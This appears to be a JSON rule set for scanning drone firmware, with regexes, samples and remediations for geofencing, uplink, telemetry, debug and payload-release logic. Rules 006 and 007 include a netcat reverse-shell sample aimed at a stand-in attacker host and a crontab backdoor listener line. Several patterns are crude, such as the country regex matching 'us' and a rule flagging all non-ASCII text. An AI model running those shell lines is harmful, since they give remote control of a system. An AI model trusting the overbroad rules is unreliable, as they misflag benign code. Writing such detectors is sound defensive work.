[
  {
    "id": "RULE-DRONE-001",
    "category": "drone",
    "type": "gps_keywords",
    "description": "Detects GPS control keywords used for drone mission logic",
    "regex": "(?i)(geo[_\\- ]?fence|kill[_\\- ]?switch|fail[_\\- ]?safe|no[_\\- ]?fly|gps[_\\- ]?lockout|emergency[_\\- ]?return|mission[_\\- ]?abort|restricted[_\\- ]?zone)",
    "sample": "mission_abort()",
    "tags": ["gps", "drone", "mission_control"],
    "consequences": "Malicious modification may trigger unwanted failsafe behavior such as landing or mission termination.",
    "remediation": "Use signed mission scripts and restrict on-device control logic editing.",
    "severity": "high",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-002",
    "category": "drone",
    "type": "gps_country_trigger",
    "description": "Detects logic tied to GPS location for country-specific behavior",
    "regex": "(?i)(iran|china|india|pakistan|north[_\\- ]?korea|russia|afghanistan|kashmir|israel|us[a]?)",
    "sample": "if country == 'iran' { disable_gps(); }",
    "tags": ["geo-fencing", "gps", "compliance"],
    "consequences": "Triggers regional restrictions or disables drone capability based on geolocation.",
    "remediation": "Avoid embedding country-specific logic in binary; move to encrypted signed policies.",
    "severity": "medium",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-003",
    "category": "drone",
    "type": "gps_region_trigger",
    "description": "Detects control logic triggered by lat/lon boundaries",
    "regex": "(?i)(if\\s*\\(\\s*lat\\s*[<>]=?\\s*[0-9]{1,3}\\.[0-9]+\\s*\\)|if\\s*\\(\\s*lon\\s*[<>]=?\\s*[0-9]{1,3}\\.[0-9]+\\s*\\))",
    "sample": "if (lat > 48.8566) { abort(); }",
    "tags": ["gps", "mission_control", "region_logic"],
    "consequences": "Can be used to trigger logic based on airspace zones or no-fly regions.",
    "remediation": "Store zone control logic externally and verify integrity using digital signatures.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-004",
    "category": "drone",
    "type": "uplink_trigger",
    "description": "Detects uplink or satcom commands used in autonomous drone control",
    "regex": "(uplink_command|tx_freq|satcom_uplink|command_rx|mission_overwrite)",
    "sample": "uplink_command = decrypt(packet)",
    "tags": ["uplink", "satcom", "remote_command"],
    "consequences": "Could allow remote adversaries to overwrite flight paths or trigger payloads.",
    "remediation": "Harden uplink paths with encryption, authentication, and command whitelisting.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-005",
    "category": "drone",
    "type": "gnss_telemetry",
    "description": "Detects GNSS protocol strings or leaked position telemetry",
    "regex": "\\$G[PN]GGA|\\$BDGSV|\\$GLGSV|\\$GAGSV",
    "sample": "$GPGGA,123519,4807.038,N,01131.000,E",
    "tags": ["telemetry", "gnss", "tracking"],
    "consequences": "Enables attacker to track drone movement or spoof location responses.",
    "remediation": "Encrypt or sign GNSS output and enforce secure channel telemetry.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-006",
    "category": "drone",
    "type": "reverse_shells",
    "description": "Detects reverse shell payloads embedded for remote access",
    "regex": "(bash -i >& /dev/tcp/|/bin/bash -c \\\".*nc .* -e /bin/sh\\\")",
    "sample": "/bin/bash -c 'nc attacker 4444 -e /bin/sh'",
    "tags": ["access", "persistence", "c2"],
    "consequences": "Reverse shells provide full remote access to the drone system during flight or idle.",
    "remediation": "Harden input validation and prevent shell invocation via dropped packets.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-007",
    "category": "drone",
    "type": "persistent_backdoors",
    "description": "Detects cron/init/systemd persistence techniques in drones",
    "regex": "(?i)(cron|systemd|init\\.d|rc\\.local|at\\.d|crontab|systemctl enable)",
    "sample": "echo '@reboot nc -l -p 1337 -e /bin/sh' >> /etc/crontab",
    "tags": ["persistence", "startup", "remote_shell"],
    "consequences": "Backdoors allow unauthorized reboot persistence for ground takeover.",
    "remediation": "Validate boot chain and runtime integrity via secure boot or TPM.",
    "severity": "high",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-008",
    "category": "drone",
    "type": "debug_uart_console",
    "description": "Detects exposed serial console or UART debug backdoors",
    "regex": "(?i)(console=tty[A-Z]*[0-9]+|ttyS[0-9]+|ttyUSB[0-9]+|serial_console|UART_DEBUG)",
    "sample": "console=ttyS0,115200",
    "tags": ["debug", "uart", "firmware"],
    "consequences": "Exposes control or bypass via physical UART/console access.",
    "remediation": "Disable debug consoles and require signed firmware for boot.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-009",
    "category": "drone",
    "type": "config_files",
    "description": "Detects embedded configuration files used by drone control logic",
    "regex": "(\\.env|config\\.yaml|settings\\.ini|application\\.properties)",
    "sample": "config.yaml",
    "tags": ["config", "sensitive", "embedded"],
    "consequences": "Hardcoded configs may contain environment keys, telemetry endpoints, or API tokens.",
    "remediation": "Externalize configs and encrypt sensitive values at rest.",
    "severity": "medium",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-010",
    "category": "drone",
    "type": "mission_keywords",
    "description": "Detects embedded mission commands and task control logic",
    "regex": "(?i)(mission_start|mission_abort|waypoint[_\\- ]?load|payload_release|drop_point|takeoff_command|land_command)",
    "sample": "if (command == 'mission_abort') { land_now(); }",
    "tags": ["control", "mission", "payload"],
    "consequences": "Manipulating mission logic can hijack or sabotage drone operations.",
    "remediation": "Move mission scripting to secure interpreters and enforce signature verification.",
    "severity": "high",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-011",
    "category": "drone",
    "type": "gnss_telemetry",
    "description": "Detects GNSS (GPS, BeiDou, GLONASS, Galileo) references in telemetry",
    "regex": "(?i)\\b(GNSS|GPS|GLONASS|Galileo|BeiDou|QZSS)\\b",
    "sample": "GPS locked: GLONASS active",
    "tags": ["telemetry", "gnss", "leakage"],
    "consequences": "May leak flight path or navigation source during operation.",
    "remediation": "Strip debug GNSS labels from production firmware and obfuscate NMEA outputs.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-012",
    "category": "drone",
    "type": "emergency_failsafe",
    "description": "Detects failsafe and emergency shutdown keywords",
    "regex": "(?i)(fail[_\\- ]?safe|abort[_\\- ]?mission|reboot -f|emergency[_\\- ]?return|e_stop)",
    "sample": "if emergency_return == true { land_now(); }",
    "tags": ["failsafe", "emergency", "mission_abort"],
    "consequences": "Can be exploited to prematurely abort missions or reboot in-air.",
    "remediation": "Harden control flags with authentication or challenge-response logic.",
    "severity": "high",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-013",
    "category": "drone",
    "type": "uplink_transmit",
    "description": "Detects continuous uplink transmission behavior in drones",
    "regex": "(uplink_freq[^a-zA-Z0-9]{0,5}[0-9]{3,10}(\\.[0-9]+)?\\s*(Hz|MHz|GHz))|uplink_send_packet|tx_uplink|sdr_tx",
    "sample": "uplink_freq=2.45GHz; uplink_send_packet(payload)",
    "tags": ["rf", "uplink", "telemetry"],
    "consequences": "Used to leak data mid-flight to unauthorized receivers.",
    "remediation": "Authenticate uplink paths and monitor RF behavior for anomalies.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-014",
    "category": "drone",
    "type": "gps_country_trigger",
    "description": "Detects hardcoded country-based GPS restrictions or triggers",
    "regex": "(?i)(iran|china|india|pakistan|north[_\\- ]?korea|russia|afghanistan|kashmir|israel|us[a]?)",
    "sample": "if gps_country == 'China' then abort_flight()",
    "tags": ["region", "geopolitics", "mission_logic"],
    "consequences": "Implies region-based blocking or surveillance embedded in firmware.",
    "remediation": "Avoid hardcoded logic; handle region constraints externally via command centers.",
    "severity": "medium",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-015",
    "category": "drone",
    "type": "geo_fence_array",
    "description": "Detects array-based GPS region definitions for flight restrictions",
    "regex": "\\{[0-9]{1,3}\\.[0-9]+,\\s*[0-9]{1,3}\\.[0-9]+(,\\s*[0-9]{1,3}\\.[0-9]+)?\\}",
    "sample": "{72.345, 18.987, 5.1}",
    "tags": ["region", "gps", "fencing"],
    "consequences": "May define restricted areas and influence auto-landing or shutdown.",
    "remediation": "Implement fencing logic via encrypted mission profiles instead of static values.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-016",
    "category": "drone",
    "type": "geo_trigger_logic",
    "description": "Detects logic comparing GPS coordinates for behavior triggers",
    "regex": "(?i)(if\\s*\\(\\s*lat\\s*[><=]\\s*[0-9]{1,3}\\.[0-9]+\\s*\\)|if\\s*\\(\\s*lon\\s*[><=]\\s*[0-9]{1,3}\\.[0-9]+\\s*\\))",
    "sample": "if (lat > 22.1) land_now();",
    "tags": ["gps", "logic", "region"],
    "consequences": "Can cause conditional actions based on adversarial spoofing or region-based sabotage.",
    "remediation": "Implement geozone validation with secure lookup tables instead of hardcoded if-checks.",
    "severity": "high",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-017",
    "category": "drone",
    "type": "language",
    "description": "Detects use of non-ASCII languages (CJK, Arabic, Cyrillic, Devanagari) in drone binaries",
    "regex": "([\\xE4-\\xE9][\\x80-\\xBF]{2}|\\xD0[\\x80-\\xBF]|\\xD1[\\x80-\\xBF]|\\xE0\\xA4[\\x80-\\xBF]|\\xD8[\\xA0-\\xBF]|\\xD9[\\x80-\\x8F])",
    "sample": "遥控器已连接",
    "tags": ["internationalization", "covert_channel", "debug"],
    "consequences": "May imply foreign firmware, debug strings, or covert identifiers.",
    "remediation": "Strip or encode localized strings from production images.",
    "severity": "low",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-018",
    "category": "drone",
    "type": "debug_commands",
    "description": "Detects embedded debug CLI or log commands in firmware",
    "regex": "(?i)(--debug|--verbose|--trace|--log-level|--log-file|--show-config|--print-env)",
    "sample": "./drone_fw.bin --debug",
    "tags": ["debug", "cli", "log"],
    "consequences": "Might expose internal state, credentials, or subsystem visibility during runtime.",
    "remediation": "Strip debug flag handlers from deployment build or obfuscate CLI structure.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-019",
    "category": "drone",
    "type": "rf_bindings",
    "description": "Detects RF binding or channel tuning functions",
    "regex": "(bind_channel|set_rf_channel|rf_bind|tune_frequency|freq_lock)",
    "sample": "tune_frequency(2.4e9)",
    "tags": ["rf", "bindings", "radio"],
    "consequences": "Might indicate unauthorized SDR pairing or dynamic reconfiguration.",
    "remediation": "Enforce fixed band policies and validate pairing authentication.",
    "severity": "medium",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-DRONE-020",
    "category": "drone",
    "type": "payload_keywords",
    "description": "Detects payload deployment keywords (e.g., release, arm)",
    "regex": "(?i)(payload[_\\- ]?arm|payload[_\\- ]?release|deploy[_\\- ]?cargo|trigger_release)",
    "sample": "payload_release();",
    "tags": ["payload", "trigger", "mission"],
    "consequences": "Adversaries may hijack or manipulate payload deployment in active flight.",
    "remediation": "Protect payload control code behind command chain validation with operator authentication.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  }
]

